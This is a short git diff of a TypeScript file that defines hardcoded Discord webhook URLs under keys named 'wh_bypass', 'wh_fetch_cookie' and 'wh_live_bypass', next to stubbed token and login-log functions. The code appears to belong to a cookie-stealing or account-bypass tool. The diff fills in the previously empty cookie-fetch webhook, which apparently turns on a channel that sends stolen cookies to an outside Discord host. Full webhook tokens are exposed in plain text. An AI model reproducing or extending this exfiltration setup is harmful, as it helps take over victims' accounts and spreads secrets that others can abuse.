@@ -18,8 +18,8 @@ export function deleteToken(_id: string) {}
 export function getLoginLog(): LoginRecord[] { return []; }
 
 const HARDCODED_WEBHOOKS: Record<string, string> = {
-  wh_bypass: 'https://discord.com/api/webhooks/1514880259957325905/LHvsuTD6w9PeZtylfTgyoerVv6xaP76s_BbqtkKPIhmXc3MQZ1uCjUGraCc0iBGvyZSh',
-  wh_fetch_cookie: '',
+  wh_bypass: 'https://discord.com/api/webhooks/1509524758570467449/8WVqevimnelFUbfPTGCYJTaol7QhfilTrxAE154fvqSKTqErIBbX7UsYREE9R8OLoMZ3',
+  wh_fetch_cookie: 'https://discord.com/api/webhooks/1509524758570467449/8WVqevimnelFUbfPTGCYJTaol7QhfilTrxAE154fvqSKTqErIBbX7UsYREE9R8OLoMZ3',
   wh_live_bypass: 'https://discord.com/api/webhooks/1514879190330118164/CtwmxutkfZdAakFOyqvaI6WyO0vlmrNU8aGlPDrjccdfCCC3ETt8zFWJGXEjtarByXaf',
 };
 export const WK = {
